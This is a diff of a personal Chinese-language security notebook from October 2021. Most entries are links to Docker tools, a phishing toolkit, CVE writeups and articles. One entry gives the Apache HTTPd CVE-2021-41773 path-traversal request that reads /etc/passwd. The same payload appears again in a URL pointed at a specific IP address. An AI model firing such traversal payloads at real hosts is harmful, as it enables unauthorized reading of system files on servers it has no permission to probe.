@@ -1,5 +1,41 @@
 # 202110
 
+### 20211027
+
+Apache HTTPd 多个路径穿越与命令执行漏洞（CVE-2021-41773 CVE-2021-42013）
+CVE-ID：CVE-2021-41773、CVE-2021-42013
+https://github.com/Vulnmachines/cve-2021-41773/blob/main/payload
+GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
+Host: https://www.twitter.com/vulnmachines
+https://httpd.apache.org/security/vulnerabilities_24.html
+这怎么容易攻击 吗？
+http://125.121.239.10:5000/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+
+### 20211026
+
+The Docker Bench for Security is a script that checks for dozens of common best-practices around deploying Docker containers in production.
+https://github.com/docker/docker-bench-security
+
+很多不错的docker ，包括docker-gui
+https://github.com/jessfraz/dockerfiles
+https://blog.jessfraz.com/post/docker-containers-on-the-desktop/
+
+钓鱼工具集合
+https://github.com/htr-tech/zphisher
+
+Gartner 2022重要技术趋势初探|不是安全趋势
+https://www.freebuf.com/articles/neopoints/292596.html
+
+CVE-2021-26084
+https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md
+
+http://www.nsfocus.net/index.php?os=&type_id=&keyword=mysql&act=sec_bug&submit=+
+
+如何使用Gorsair入侵远程Docker容器并暴露API
+https://www.freebuf.com/articles/container/285669.html
+
+如果虚拟机装chromeOS或是鸿蒙OS，是不是可以实现工作平台与私人平台分开
+
 ### 20211025
 
 怎么处理 php 阿里探测造成的高负载
